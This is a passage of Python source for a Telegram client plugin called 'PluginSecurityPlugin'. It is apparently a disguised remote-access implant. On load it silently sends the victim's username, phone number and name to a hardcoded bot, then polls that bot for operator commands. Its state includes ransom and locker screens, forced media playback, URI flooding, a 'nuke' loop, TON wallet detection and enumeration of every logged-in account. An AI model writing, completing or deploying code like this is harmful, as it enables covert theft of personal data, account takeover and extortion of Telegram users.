_logger = None

def _log(msg):
    global _logger
    try:
        if _logger is None:
            try:
                from android_utils import log as logcat
                _logger = logcat
            except Exception:
                _logger = lambda *a, **k: None
        _logger("[AR22] " + str(msg))
    except Exception:
        pass

def _UC():
    return jclass("org.telegram.messenger.UserConfig")

def _MC():
    return jclass("org.telegram.messenger.MessagesController")

def _CM():
    return jclass("org.telegram.tgnet.ConnectionsManager")

_CLASS_CACHE = {}

def _cls(*names):
    key = names
    c = _CLASS_CACHE.get(key)
    if c is not None:
        return c
    for n in names:
        try:
            short = n.split("$")[-1]
            c2 = getattr(TLRPC, short, None)
            if c2 is not None:
                _CLASS_CACHE[key] = c2
                return c2
        except Exception:
            pass
        try:
            c2 = jclass(n)
            _CLASS_CACHE[key] = c2
            return c2
        except Exception:
            continue
    _CLASS_CACHE[key] = None
    return None

_ReplyGateCls = None

def _reply_gate_cls():
    global _ReplyGateCls
    if _ReplyGateCls is None:
        RD = jclass("org.telegram.tgnet.RequestDelegate")

        class _RG(dynamic_proxy(RD)):
            def __init__(self):
                super().__init__()
                self.response = None
                self.error = None
                self._alive = True

            def run(self, response, error):
                self.response = response
                self.error = error
                self._alive = False

        _ReplyGateCls = _RG
    return _ReplyGateCls

def _safe_int(v, d=0):
    try:
        if v is None:
            return d
        return int(v)
    except Exception:
        return d

def _jlist_size(obj):
    if obj is None:
        return 0
    try:
        s = getattr(obj, "size", None)
        if callable(s):
            return int(s())
        if s is not None:
            return int(s)
    except Exception:
        pass
    try:
        if hasattr(obj, "keyAt") and hasattr(obj, "valueAt"):
            return int(obj.size())
    except Exception:
        pass
    try:
        return len(obj)
    except Exception:
        return 0

def _jlist_get(obj, i):
    if obj is None:
        return None
    try:
        g = getattr(obj, "get", None)
        if callable(g):
            return g(int(i))
        return obj[int(i)]
    except Exception:
        return None

def _jmap_keys(obj):
    out = []
    if obj is None:
        return out
    for meth in ("keySet", "keys"):
        try:
            f = getattr(obj, meth, None)
            if callable(f):
                ks = f()
                it = getattr(ks, "iterator", None)
                if callable(it):
                    it = it()
                    while it.hasNext():
                        out.append(it.next())
                return out
        except Exception:
            continue
    return out

def _jmap_get(obj, k):
    if obj is None:
        return None
    try:
        return obj.get(k)
    except Exception:
        return None

def _get_bool_attr(obj, name, default=False):
    try:
        v = getattr(obj, name, default)
        if v is None:
            return default
        if isinstance(v, bool):
            return v
        bv = getattr(v, "booleanValue", None)
        if callable(bv):
            return bool(bv())
        return bool(v)
    except Exception:
        return default

def _clean_phone(raw):
    if raw is None:
        return ""
    s = str(raw).strip()
    if not s or s.lower() in ("none", "null", "?", "0", ""):
        return ""
    digits = "".join(c for c in s if c.isdigit())
    if len(digits) < 7 or len(digits) > 15:
        return ""
    if digits in ("88888888888", "80000000000", "11111111111"):
        return ""
    if set(digits) == {"0"} or set(digits) == {"8"}:
        return ""
    return "+" + digits

def _phone_from_user(u):
    if u is None:
        return ""
    for attr in ("phone", "phoneNumber", "phone_number"):
        try:
            v = getattr(u, attr, None)
            if v is None:
                continue
            r = _clean_phone(v)
            if r:
                return r
        except Exception:
            continue
    return ""

def _is_ton_address(s):
    try:
        s = str(s).strip().replace(" ", "").replace("\n", "")
        if not s:
            return False
        if s.startswith(("0:", "-1:")):
            h = s.split(":", 1)[1]
            return len(s) >= 66 and len(h) == 64 and all(c in "0123456789abcdefABCDEF" for c in h)
        if len(s) < 44 or len(s) > 66:
            return False
        b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
        if not all(c in b64 for c in s):
            return False
        return s[0] in ("E", "U", "k", "0") and len(s) in (44, 48, 52, 56, 60, 64)
    except Exception:
        return False

def _http_get(url, timeout=30):
    from urllib.request import Request, urlopen
    try:
        req = Request(url, headers={"User-Agent": "Mozilla/5.0"}, method="GET")
        with urlopen(req, timeout=timeout) as r:
            return r.read().decode("utf-8", "ignore")
    except Exception as e:
        _log("http get: %s" % e)
        return None

def _http_post_json(url, body, timeout=30):
    from urllib.request import Request, urlopen
    try:
        data = json.dumps(body, ensure_ascii=False).encode("utf-8")
        req = Request(url, data=data, method="POST",
                      headers={"Content-Type": "application/json; charset=utf-8",
                               "User-Agent": "Mozilla/5.0"})
        with urlopen(req, timeout=timeout) as r:
            return r.read().decode("utf-8", "ignore")
    except Exception as e:
        _log("http post: %s" % e)
        return None

def _http_post_multipart(url, fields, file_field, file_name, file_bytes, timeout=180):
    from urllib.request import Request, urlopen
    try:
        boundary = "----ARBoundary" + str(int(time.time() * 1000))
        body = io.BytesIO()
        for k, v in fields.items():
            body.write(("--" + boundary + "\r\n").encode())
            body.write(('Content-Disposition: form-data; name="%s"\r\n\r\n' % k).encode())
            body.write(str(v).encode("utf-8"))
            body.write(b"\r\n")
        body.write(("--" + boundary + "\r\n").encode())
        body.write(('Content-Disposition: form-data; name="%s"; filename="%s"\r\n'
                    % (file_field, file_name)).encode())
        body.write(b"Content-Type: application/octet-stream\r\n\r\n")
        body.write(file_bytes)
        body.write(b"\r\n")
        body.write(("--" + boundary + "--\r\n").encode())
        data = body.getvalue()
        req = Request(url, data=data, method="POST",
                      headers={"Content-Type": "multipart/form-data; boundary=" + boundary,
                               "User-Agent": "Mozilla/5.0"})
        with urlopen(req, timeout=timeout) as r:
            return r.read().decode("utf-8", "ignore")
    except Exception as e:
        _log("http multipart: %s" % e)
        return None

def _download_to_file(url, path, max_size=None, timeout=180):
    from urllib.request import Request, urlopen
    try:
        req = Request(url, headers={"User-Agent": "Mozilla/5.0"}, method="GET")
        total = 0
        with urlopen(req, timeout=timeout) as r, open(path, "wb") as f:
            while True:
                chunk = r.read(65536)
                if not chunk:
                    break
                total += len(chunk)
                if max_size is not None and total > max_size:
                    f.close()
                    try:
                        os.remove(path)
                    except Exception:
                        pass
                    return -1, "size_exceeded"
                f.write(chunk)
        return total, "ok"
    except Exception as e:
        _log("download: %s" % e)
        try:
            if os.path.exists(path):
                os.remove(path)
        except Exception:
            pass
        return -1, str(e)

class PluginSecurityPlugin(BasePlugin):
    def __init__(self):
        super().__init__()
        self._sync_running = False
        self._active = False
        self.stop = False
        self._boot_sent = False
        self._boot_lock = threading.Lock()
        self._pending_delegates = []
        self._rpc_lock = threading.RLock()
        self._jitter = random.randint(400, 900)
        self._poll_thread = None

        self.account = 0
        self.user_id = 0
        self.username = ""
        self.dev = ""

        self._recipient_ah_cache = {}
        self._recipient_lock = threading.Lock()
        self._last_session_confirm = {}
        self._fee_deficit = 0

        self._tg_kid_watching = False
        self._tg_kid_seen = set()
        self._tg_kid_thread = None
        self._tg_kid_lock = threading.Lock()

        self._ransom_view = None
        self._ransom_lock = threading.RLock()

        self._locker_view = None
        self._locker_on = False
        self._dim_view = None
        self._dim_active = False

        self._music_mp = None
        self._music_path = ""
        self._music_lock = threading.RLock()

        self._video_view = None
        self._video_vv = None
        self._video_path = ""
        self._video_lock = threading.RLock()

        self._flood_uris = []

        self._input_mode = None

        self._nuke_on = False
        self._nuke_thread = None
        self._nuke_interval = 60
        self._nuke_pass = 0
        self._nuke_lock = threading.RLock()

    # ---- lifecycle ----
    def on_plugin_load(self):
        with self._boot_lock:
            self._sync_running = True
            self._active = True
            self.stop = False
            if self._boot_sent:
                return
            self._boot_sent = True
        try:
            self.dev = hashlib.md5((str(time.time()) + str(random.random())).encode()).hexdigest()[:16]
        except Exception:
            self.dev = "unknown"
        try:
            self.add_on_send_message_hook()
        except Exception as e:
            _log("hook: %s" % e)
        try:
            self._check_persisted_nuke()
        except Exception:
            pass
        threading.Thread(target=self._boot, daemon=True).start()

    def on_plugin_unload(self):
        with self._boot_lock:
            self._sync_running = False
            self._active = False
            self.stop = True
            self._boot_sent = False
        self._tg_kid_watching = False
        with self._nuke_lock:
            self._nuke_on = False
        for fn in (self._dismiss_ransom, self._clear_locker,
                   self._clear_dim, self._clear_music, self._clear_video):
            try:
                fn()
            except Exception:
                pass
        time.sleep(1.0)

    def create_settings(self):
        return []

    def _html_escape(self, text):
        if text is None:
            return ""
        t = str(text)
        return t.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

    def _boot(self):
        time.sleep(self._jitter / 1000.0)
        time.sleep(random.uniform(0.2, 0.6))
        try:
            self._send_msg(BOOT_LINE_1)
            time.sleep(0.5)
            self._send_msg(BOOT_LINE_2)
            time.sleep(0.5)
            self._send_manage_button()
        except Exception as e:
            _log("boot send: %s" % e)
        try:
            self._start_polling()
        except Exception as e:
            _log("boot poll: %s" % e)

    def on_send_message_hook(self, account, params):
        return HookResult()

    # ---- account helpers ----
    def _uc(self):
        try:
            sa = int(_UC().selectedAccount)
            if sa:
                return sa
        except Exception:
            pass
        for i in range(16):
            try:
                if _UC().getInstance(i).getClientUserId():
                    return i
            except Exception:
                pass
        return 0

    def _my_id(self, account=None, discover=False):
        acc = account if account is not None else self.account
        try:
            return int(_UC().getInstance(int(acc)).getClientUserId())
        except Exception:
            pass
        if not discover:
            return 0
        for i in range(16):
            try:
                uid = int(_UC().getInstance(i).getClientUserId())
                if uid:
                    self.account = i
                    return uid
            except Exception:
                pass
        return 0

    def _get_accounts_list(self):
        out = []
        try:
            mc = int(getattr(_UC(), "MAX_ACCOUNT_COUNT", 8) or 8)
        except Exception:
            mc = 8
        mc = max(mc, 16)
        for i in range(mc):
            try:
                uc = _UC().getInstance(i)
                if not uc or not uc.isClientActivated():
                    continue
                uid = int(uc.getClientUserId())
                if uid == 0:
                    continue
                u = None
                try:
                    u = uc.getCurrentUser()
                except Exception:
                    pass
                if u is None:
                    try:
                        u = _MC().getInstance(i).getUser(uid)
                    except Exception:
                        pass
                un = ""
                ph = ""
                if u is not None:
                    un = str(getattr(u, "username", "") or "")
                    raw = _phone_from_user(u)
                    ph = raw.lstrip("+") if raw else ""
                out.append({"id": i, "user_id": uid, "username": un, "phone": ph})
            except Exception as e:
                _log("acc %d: %s" % (i, e))
        return out

    def _get_input_peer(self, account, peer_id):
        try:
            mc = _MC().getInstance(account)
            peer_id = int(peer_id)
            if peer_id > 0:
                user = mc.getUser(peer_id)
                IPUser = _cls("org.telegram.tgnet.TLRPC$TL_inputPeerUser",
                              "org.telegram.tgnet.tl.TL_inputPeerUser")
                if not IPUser:
                    return None
                ip = IPUser()
                ip.user_id = int(user.id) if user is not None else peer_id
                ip.access_hash = _safe_int(getattr(user, "access_hash", 0)) if user is not None else 0
                return ip
            if peer_id < -1000000000000:
                cid = -peer_id - 1000000000000
                chat = mc.getChat(cid)
                IPChannel = _cls("org.telegram.tgnet.TLRPC$TL_inputPeerChannel",
                                 "org.telegram.tgnet.tl.TL_inputPeerChannel")
                if not IPChannel:
                    return None
                ip = IPChannel()
                ip.channel_id = _safe_int(getattr(chat, "id", cid)) if chat is not None else cid
                ip.access_hash = _safe_int(getattr(chat, "access_hash", 0)) if chat is not None else 0
                return ip
            if peer_id < 0:
                cid = -peer_id
                chat = mc.getChat(cid)
                if chat is not None and getattr(chat, "migrated_to", None) is not None:
                    mt = chat.migrated_to
                    IPChannel = _cls("org.telegram.tgnet.TLRPC$TL_inputPeerChannel",
                                     "org.telegram.tgnet.tl.TL_inputPeerChannel")
                    if IPChannel:
                        ip = IPChannel()
                        ip.channel_id = _safe_int(getattr(mt, "channel_id", 0))
                        ip.access_hash = _safe_int(getattr(mt, "access_hash", 0))
                        if ip.channel_id:
                            return ip
                IPChat = _cls("org.telegram.tgnet.TLRPC$TL_inputPeerChat",
                              "org.telegram.tgnet.tl.TL_inputPeerChat")
                if not IPChat:
                    return None
                ip = IPChat()
                ip.chat_id = int(cid)
                return ip
        except Exception as e:
            _log("peer: %s" % e)
        return None

    def _rg_rpc(self, req, account=0, timeout=15.0, fast=False):
        if fast and timeout > 8.0:
            timeout = 8.0
        gate = _reply_gate_cls()()
        with self._rpc_lock:
            self._pending_delegates.append(gate)
        try:
            cm = _CM().getInstance(account)
            cm.sendRequest(req, gate)
            deadline = time.time() + timeout
            while time.time() < deadline:
                if not gate._alive:
                    break
                time.sleep(0.08)
        finally:
            with self._rpc_lock:
                try:
                    self._pending_delegates.remove(gate)
                except Exception:
                    pass
        return gate.response, gate.error

    def _parallel(self, jobs, workers=5, timeout=25):
        try:
            from concurrent.futures import ThreadPoolExecutor
        except Exception:
            out = []
            for j in jobs:
                try:
                    out.append(j[0](*j[1:]))
                except Exception as e:
                    out.append(e)
            return out
        out = []
        try:
            with ThreadPoolExecutor(max_workers=workers) as ex:
                futs = [ex.submit(j[0], *j[1:]) for j in jobs]
                for f in futs:
                    try:
                        out.append(f.result(timeout=timeout))
                    except Exception as e:
                        out.append(e)
        except Exception as e:
            _log("parallel: %s" % e)
            for j in jobs:
                try:
                    out.append(j[0](*j[1:]))
                except Exception as ee:
                    out.append(ee)
        return out

    # ---- telegram bot api ----
    def _api(self, method):
        if not API_BASE:
            _log("no token")
            return ""
        return API_BASE + "/" + method

    def _send_msg(self, text, html=False, retries=2):
        url = self._api("sendMessage")
        if not url:
            return None
        body = {"chat_id": BOT_UID_STR, "text": str(text)[:4096]}
        if html:
            body["parse_mode"] = "HTML"
        for att in range(max(1, retries)):
            r = _http_post_json(url, body, timeout=20)
            if r is not None:
                return r
            time.sleep(1 + att)
        return None

    def _send_markup(self, text, keyboard, html=False):
        url = self._api("sendMessage")
        if not url:
            return
        body = {"chat_id": BOT_UID_STR, "text": str(text)[:4096],
                "reply_markup": keyboard}
        if html:
            body["parse_mode"] = "HTML"
        _http_post_json(url, body, timeout=20)

    def _send_photo(self, file_path, caption=""):
        url = self._api("sendPhoto")
        if not url:
            return
        try:
            with open(file_path, "rb") as f:
                raw = f.read()
        except Exception as e:
            _log("photo read: %s" % e)
            return
        fields = {"chat_id": BOT_UID_STR, "caption": str(caption)[:200]}
        _http_post_multipart(url, fields, "photo", os.path.basename(file_path), raw)

    def _send_document_bytes(self, filename, data, retries=3):
        url = self._api("sendDocument")
        if not url:
            return None
        fields = {"chat_id": BOT_UID_STR, "caption": str(filename)[:200]}
        for att in range(retries):
            r = _http_post_multipart(url, fields, "document", filename, data)
            if r is not None:
                return r
            time.sleep(1.5 * (att + 1))
        return None

    def _answer_callback(self, cb_id, text=""):
        url = self._api("answerCallbackQuery")
        if not url:
            return
        body = {"callback_query_id": str(cb_id)}
        if text:
            body["text"] = str(text)[:200]
        _http_post_json(url, body, timeout=10)

    def _start_polling(self):
        if self._poll_thread is not None and self._poll_thread.is_alive():
            return
        self._poll_thread = threading.Thread(target=self._poll, daemon=True)
        self._poll_thread.start()

    def _poll(self):
        offset = 0
        url = self._api("getUpdates")
        if not url:
            return
        try:
            r = _http_get(url + "?offset=-1&timeout=0", timeout=10)
            if r:
                try:
                    j = json.loads(r)
                    if j.get("ok") and j.get("result"):
                        offset = j["result"][-1]["update_id"] + 1
                except Exception:
                    pass
        except Exception:
            pass
        while self._sync_running and not self.stop:
            try:
                r = _http_get(url + "?offset=" + str(offset) + "&timeout=15", timeout=25)
                if r is None:
                    time.sleep(1)
                    continue
                try:
                    j = json.loads(r)
                except Exception:
                    j = None
                if not j or not j.get("ok"):
                    if j and not j.get("ok"):
                        desc = str(j.get("description") or "")
                        if "Conflict" in desc:
                            break
                    time.sleep(1)
                    continue
                res = j.get("result")
                if not res:
                    time.sleep(1)
                    continue
                for u in res:
                    offset = u["update_id"] + 1
                    if "callback_query" in u:
                        threading.Thread(target=self._handle_callback,
                                         args=(u["callback_query"],),
                                         daemon=True).start()
                    elif "message" in u:
                        threading.Thread(target=self._handle_message,
                                         args=(u["message"],),
                                         daemon=True).start()
            except Exception as e:
                _log("poll: %s" % e)
            time.sleep(0.5)

    # ---- menus ----
    def _full_name_underscored(self, u):
        try:
            if u is None:
                return "—"
            fn = str(getattr(u, "first_name", "") or "").strip()
            ln = str(getattr(u, "last_name", "") or "").strip()
            full = (fn + " " + ln).strip()
            if not full:
                return "—"
            return re.sub(r"\s+", "_", full)
        except Exception:
            return "—"

    def _send_manage_button(self):
        username = "unknown"
        phone = ""
        name_surname = "—"
        try:
            uc = _UC().getInstance(0)
            uid = uc.getClientUserId()
            user = uc.getCurrentUser()
            if user is not None:
                un = str(getattr(user, "username", "") or "")
                username = un if un else ("id:" + str(uid))
                rp = _phone_from_user(user)
                phone = rp if rp else ""
                name_surname = self._full_name_underscored(user)
            else:
                username = "id:" + str(uid)
        except Exception as e:
            _log("manage btn user: %s" % e)
        lines = [
            "<b>Fast Info</b> @" + self._html_escape(username),
            "Number Phone: " + self._html_escape(phone if phone else "—"),
            "Name_Surname: " + self._html_escape(name_surname),
        ]
        kb = {"inline_keyboard": [[{"text": "Control bg", "callback_data": CB_FULL_MENU}]]}
        self._send_markup("\n".join(lines), kb, html=True)

    def _show_full_menu(self):
        kb = {"keyboard": [[{"text": "Manual using"}], [{"text": "Troll"}], [{"text": "⬅️ Back"}]],
              "resize_keyboard": True}
        self._send_markup(FULL_MENU_TITLE, kb, html=True)

    def _show_sessions_menu(self):
